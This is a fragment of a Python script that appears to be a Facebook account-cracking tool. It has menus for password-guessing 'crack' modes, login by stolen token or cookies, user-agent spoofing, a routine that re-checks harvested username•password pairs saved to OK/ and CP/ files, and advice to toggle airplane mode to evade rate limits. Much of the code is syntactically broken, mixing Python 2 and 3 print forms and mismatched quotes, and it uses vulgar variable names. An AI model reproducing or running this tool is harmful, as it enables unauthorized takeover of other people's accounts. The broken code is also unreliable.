        print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
    else:
        print("%s► %sPassword Has Changed"%(H,M))
def cek_hasil():
    jalan('%s►%s►%s► %sCheck Crack Result Account Options'%(B,H,M,O))
    print('%s►%s►%s► %sExample File : CP/%s.txt'%(B,H,M,O,tanggal))
    files = input('%s►%s►%s► %sFile : '%(B,H,M,O))
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print("%s►%s►%s► %sFile Not Existing"%(B,H,M,O))
        time.sleep(2); cek_hasil()
    print("%s►%s►%s► %sNumber of Accounts : %s"%(B,H,M,O,str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("•")
        print("%s► %sCheck Login : %s"%(H,O,kontol))
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('%s►%s►%s► %s Checking Process Complete'%(B,H,M,O))
    input('%s►%s►%s► %sReturn'%(B,H,M,O))
    menu()
def var_menu():
    print (' %s*%sMethod Login'%(B,H,M,O))
    print ' [%s02%s] Login with Token'%(B,H,M,O))
    print ' [%s03%s] Login with Cookies'%(B,H,M,O))
    #print('%s►%s►%s► 4. %sScript Usage Tutorial'%(B,H,M,O))
    #print('%s►%s►%s► 5. %sInfo Author & Team Project'%(B,H,M,O))
    print ' [%s01%s] 0. %sGo Back'%(B,H,M,O))
def var_ugen():
    print ' [%s01%s] 1. %sGet User Agent"%(B,H,M,O))
    print ' [%s02%s] 2. %sChange User Agent%s(%sManual%s)"%(B,H,M,U,O,H,O))
    print ' [%s03%s] 3. %sChange User Agent %s(%sAdjust HP%s)"%(B,H,M,U,O,H,O))
    print ' [%s04%s] 4. %sDelete User Agent"%(B,H,M,O))
    print ' [%s05%s] 5. %sCheck User Agent"%(B,H,M,O))
    print ' [%s00%s] %sReturn"%(B,H,M,O))
def start_method():
    print ' [%s01%s] 1. %sMethod Api'%(B,H,M,O))
    print ' [%s02%s] 2. %sMethod Mbasic'%(B,H,M,O))
    print ' [%s03%s] 3. %sMethod Free FB'%(B,H,M,O))
def start_methodezz():
    print ' [%s01%s] Fast Crack %s[%s6 pass%s]'%(B,H,M,U,O,K,O))
    print ' [%s02%s] Slow Crack %s[%s9 pass%s]'%(B,H,M,U,O,K,O))
    print ' [%s03%s] Very Slow Crack %s[%s12 pass%s]'%(B,H,M,U,O,K,O))
    print ' [%s04%s] Crack Password Combine'%(B,H,M,O))
def started():
    print ' [%s01%s] Crack Is Running...'%(B,H,O))
    print ' [%s02%s] Account [OK] Saved To OK/%s.txt'%(B,H,O,tanggal))
    print ' [%s03%s] Account [CP] Saved To CP/%s.txt'%(B,H,O,tanggal))
    print ' [%s04%s] Activate Airplane Mode [5 Seconds Only] Every 5 Minutes\n'%(B,H,O))
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass
if __name__=='__main__':
  os.system('git pull')
  folder()
  menu()
# Mau Ngapain Cuk?
